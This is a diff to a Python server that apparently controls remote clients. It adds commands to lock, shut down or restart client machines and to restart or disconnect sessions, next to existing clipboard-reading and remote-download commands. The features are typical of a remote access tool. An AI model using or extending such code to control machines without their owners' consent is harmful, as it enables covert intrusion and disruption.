@@ -30,6 +30,11 @@ interface_help = """
 --d | Download file from the web
 --c | Copies to Client Clipboard
 --p | Returns Client Current Clipboard
+--q 1 | Lock Client Machine (Windows)
+--q 2 | Shutdown Client Machine
+--q 3 | Restart Client Machine
+--x 1 | Restart Client Session
+--x 2 | Disconnect Client
 --b | Run Connection in Background"""
 
 turtle_help = """
@@ -234,7 +239,7 @@ class MultiServer(object):
                 publicKey = None
                 logging.debug(e)
 
-    def list_connections(self):
+    def list_connections(self, _print=True):
         """ List all connections """
         results = ''
         for i, conn in enumerate(self.all_connections):
@@ -248,7 +253,8 @@ class MultiServer(object):
                 continue
             results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                 self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
-        print('----- Clients -----' + '\n' + results)
+        if _print:
+            print('----- Clients -----' + '\n' + results)
         return
 
     def get_target(self, cmd):
@@ -405,6 +411,38 @@ class MultiServer(object):
                 self.send(conn, json_dumps(['--p']))
                 self.receive(conn)
                 continue
+            if command[:3] == '--x':
+                command = command[4:].strip()
+                if command == '1':
+                    self.send(conn, json_dumps(['--x', '1']))
+                    self.receive(conn)
+                    time.sleep(2)
+                    conn.close()
+                    self.list_connections(_print=False)
+                    return
+                elif command == '2':
+                    self.send(conn, json_dumps(['--x', '2']))
+                    self.receive(conn)
+                    time.sleep(2)
+                    conn.close()
+                    self.list_connections(_print=False)
+                    return
+            if command[:3] == '--q':
+                command = command[4:].strip()
+                if command == '1':
+                    self.send(conn, json_dumps(['--q', '1']))
+                    self.receive(conn)
+                    continue
+                elif command == '2':
+                    self.send(conn, json_dumps(['--q', '2']))
+                    print('Shutdown Client Machine.')
+                    self.list_connections(_print=False)
+                    return
+                elif command == '3':
+                    self.send(conn, json_dumps(['--q', '3']))
+                    print('Restarted Client Machine.')
+                    self.list_connections(_print=False)
+                    return
             if '--d' in command:
                 file_url = input('File URL: ')
                 file_name = input('Filename: ')
